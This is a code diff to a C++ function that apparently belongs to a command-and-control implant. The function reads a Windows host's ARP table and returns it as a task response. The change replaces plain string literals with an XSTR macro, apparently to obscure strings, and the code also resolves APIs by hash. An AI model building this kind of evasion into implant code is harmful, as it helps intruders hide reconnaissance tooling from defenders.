@@ -57,7 +57,7 @@ auto declfn starburst::cmd_arp(
     auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_iphlpapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LoadLibrary iphlpapi failed" ) ) );
+            XSTR( "LoadLibrary iphlpapi failed" ) );
         return;
     }
 
@@ -66,7 +66,7 @@ auto declfn starburst::cmd_arp(
             expr::hash_string( "GetIpNetTable" ) ) );
     if ( !pGetIpNetTable ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetIpNetTable not found" ) ) );
+            XSTR( "GetIpNetTable not found" ) );
         return;
     }
 
@@ -74,21 +74,21 @@ auto declfn starburst::cmd_arp(
     pGetIpNetTable( nullptr, &buf_size, FALSE );
     if ( buf_size == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "ARP table empty" ) ) );
+            XSTR( "ARP table empty" ) );
         return;
     }
 
     auto table = static_cast<MIB_IPNETTABLE*>( inst.heap_alloc( buf_size ) );
     if ( !table ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
     if ( pGetIpNetTable( table, &buf_size, TRUE ) != 0 ) {
         inst.heap_free( table );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetIpNetTable failed" ) ) );
+            XSTR( "GetIpNetTable failed" ) );
         return;
     }
 
@@ -97,13 +97,12 @@ auto declfn starburst::cmd_arp(
     if ( !output ) {
         inst.heap_free( table );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
     uint32_t off = 0;
-    str_copy( output + off, symbol<char*>( const_cast<char*>(
-        "IP Address\tMAC Address\tType\tInterface\n" ) ) );
+    str_copy( output + off, XSTR("IP Address\tMAC Address\tType\tInterface\n") );
     off = str_len( output );
 
     char hex_chars[] = { '0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F' };
@@ -130,23 +129,23 @@ auto declfn starburst::cmd_arp(
         // Type
         switch ( row.dwType ) {
             case 1:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Other" ) ) );
+                str_copy( output + off, XSTR( "Other" ) );
                 off += 5;
                 break;
             case 2:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Invalid" ) ) );
+                str_copy( output + off, XSTR( "Invalid" ) );
                 off += 7;
                 break;
             case 3:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Dynamic" ) ) );
+                str_copy( output + off, XSTR( "Dynamic" ) );
                 off += 7;
                 break;
             case 4:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Static" ) ) );
+                str_copy( output + off, XSTR( "Static" ) );
                 off += 6;
                 break;
             default:
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "Unknown" ) ) );
+                str_copy( output + off, XSTR( "Unknown" ) );
                 off += 7;
                 break;
         }
